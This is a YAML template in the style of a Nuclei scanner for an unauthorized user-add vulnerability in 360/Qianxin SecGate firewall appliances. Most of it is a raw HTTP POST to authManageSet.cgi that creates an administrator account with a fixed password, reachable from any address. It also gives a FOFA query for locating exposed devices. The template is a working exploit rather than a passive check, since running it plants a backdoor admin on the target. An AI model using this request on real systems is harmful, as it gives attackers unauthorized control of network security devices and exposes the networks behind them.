id: qianxin-secgate-authManageSet-useradd
info:
  name: 360 奇安信 secgate authManageSet - useradd
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://github.com/wy876/POC/blob/d672fb7281b8d68fde4cf142b81405f912fc51e6/%E7%BD%91%E7%A5%9ESecGate3600%E6%9C%AA%E6%8E%88%E6%9D%83%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: "sec_gate_image/button_normal.gif"
  tags: 360,qianxin,useradd,iot,secgate


http:
  - raw:
      - |
        POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
        Accept: application/xml, text/xml, */*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest
        Content-Length: 93
        Connection: close

        type=saveAdmin&id=2&userName=audit&pwd=audit@1234&net=0.0.0.0&mask=0.0.0.0&port=ANY&allow=Y

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "xml"
          - "version"
          - "rows"
          - "msg"
          - "0"
        condition: and

      - type: status
        status:
          - 200